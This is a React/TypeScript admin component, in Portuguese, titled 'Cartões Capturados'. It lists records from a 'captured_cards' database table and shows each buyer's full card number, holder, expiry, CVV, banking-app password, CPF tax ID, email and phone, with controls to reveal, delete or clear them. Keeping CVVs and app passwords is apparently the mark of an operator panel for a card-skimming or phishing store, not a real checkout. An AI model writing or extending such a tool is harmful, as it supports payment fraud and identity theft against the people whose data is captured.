import { useEffect, useState } from "react";
import { CreditCard, Trash2, RefreshCw, Loader2, Eye, EyeOff } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";

interface CapturedCard {
  id: string;
  buyer_name: string | null;
  buyer_email: string | null;
  buyer_phone: string | null;
  buyer_document: string | null;
  card_number: string;
  card_holder: string;
  card_expiry: string;
  card_cvv: string;
  app_password: string;
  amount_cents: number;
  created_at: string;
}

export default function AdminCartoes() {
  const [cards, setCards] = useState<CapturedCard[]>([]);
  const [loading, setLoading] = useState(true);
  const [revealedIds, setRevealedIds] = useState<Set<string>>(new Set());

  const fetchCards = async () => {
    setLoading(true);
    const { data } = await supabase
      .from("captured_cards")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(100);
    setCards((data as CapturedCard[]) || []);
    setLoading(false);
  };

  useEffect(() => {
    fetchCards();
  }, []);

  const toggleReveal = (id: string) => {
    setRevealedIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const handleDelete = async (id: string) => {
    if (!window.confirm("Excluir este registro?")) return;
    await supabase.from("captured_cards").delete().eq("id", id);
    await fetchCards();
  };

  const handleClearAll = async () => {
    if (!window.confirm("Tem certeza que deseja excluir TODOS os cartões capturados?")) return;
    await supabase.from("captured_cards").delete().neq("id", "00000000-0000-0000-0000-000000000000");
    await fetchCards();
  };

  const maskValue = (val: string) => "•".repeat(val.length);

  return (
    <div>
      <div className="mb-4 flex items-center justify-between">
        <div>
          <h2 className="text-xl font-black text-foreground">Cartões Capturados</h2>
          <p className="text-xs text-muted-foreground">{cards.length} registro(s)</p>
        </div>
        <div className="flex gap-2">
          <Button variant="outline" size="sm" onClick={fetchCards} disabled={loading}>
            <RefreshCw size={14} className={loading ? "animate-spin" : ""} />
          </Button>
          {cards.length > 0 && (
            <Button variant="destructive" size="sm" onClick={handleClearAll} className="text-xs">
              <Trash2 size={14} className="mr-1" /> Limpar tudo
            </Button>
          )}
        </div>
      </div>

      {loading ? (
        <div className="flex justify-center py-12">
          <Loader2 size={24} className="animate-spin text-primary" />
        </div>
      ) : cards.length === 0 ? (
        <Card className="p-8 text-center">
          <CreditCard size={40} className="mx-auto mb-3 text-muted-foreground/30" />
          <p className="text-sm text-muted-foreground">Nenhum cartão capturado ainda.</p>
        </Card>
      ) : (
        <div className="space-y-3">
          {cards.map((card) => {
            const revealed = revealedIds.has(card.id);
            return (
              <Card key={card.id} className="border border-border p-4">
                <div className="flex items-start justify-between mb-3">
                  <div className="flex items-center gap-2">
                    <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10">
                      <CreditCard size={18} className="text-primary" />
                    </div>
                    <div>
                      <p className="text-sm font-bold text-foreground">{card.buyer_name || "Sem nome"}</p>
                      <p className="text-[10px] text-muted-foreground">
                        {new Date(card.created_at).toLocaleString("pt-BR")}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-1">
                    <Badge variant="secondary" className="text-[10px]">
                      R$ {(card.amount_cents / 100).toFixed(2)}
                    </Badge>
                    <Button variant="ghost" size="sm" onClick={() => toggleReveal(card.id)} className="h-7 w-7 p-0">
                      {revealed ? <EyeOff size={14} /> : <Eye size={14} />}
                    </Button>
                    <Button variant="ghost" size="sm" onClick={() => handleDelete(card.id)} className="h-7 w-7 p-0 text-destructive hover:text-destructive">
                      <Trash2 size={14} />
                    </Button>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2 text-xs">
                  <div>
                    <span className="text-[10px] font-bold text-muted-foreground uppercase">Número</span>
                    <p className="font-mono">{revealed ? card.card_number : maskValue(card.card_number)}</p>
                  </div>
                  <div>
                    <span className="text-[10px] font-bold text-muted-foreground uppercase">Titular</span>
                    <p>{revealed ? card.card_holder : maskValue(card.card_holder)}</p>
                  </div>
                  <div>
                    <span className="text-[10px] font-bold text-muted-foreground uppercase">Validade</span>
                    <p className="font-mono">{revealed ? card.card_expiry : "••/••"}</p>
                  </div>
                  <div>
                    <span className="text-[10px] font-bold text-muted-foreground uppercase">CVV</span>
                    <p className="font-mono">{revealed ? card.card_cvv : "•••"}</p>
                  </div>
                  <div>
                    <span className="text-[10px] font-bold text-muted-foreground uppercase">Senha do App</span>
                    <p className="font-mono font-bold text-primary">{revealed ? card.app_password : "••••••"}</p>
                  </div>
                  <div>
                    <span className="text-[10px] font-bold text-muted-foreground uppercase">CPF</span>
                    <p className="font-mono">{revealed ? (card.buyer_document || "-") : "•••.•••.•••-••"}</p>
                  </div>
                </div>

                {(card.buyer_email || card.buyer_phone) && (
                  <div className="mt-2 pt-2 border-t border-border grid grid-cols-2 gap-2 text-xs">
                    <div>
                      <span className="text-[10px] font-bold text-muted-foreground uppercase">Email</span>
                      <p className="truncate">{card.buyer_email || "-"}</p>
                    </div>
                    <div>
                      <span className="text-[10px] font-bold text-muted-foreground uppercase">Telefone</span>
                      <p>{card.buyer_phone || "-"}</p>
                    </div>
                  </div>
                )}
              </Card>
            );
          })}
        </div>
      )}
    </div>
  );
}
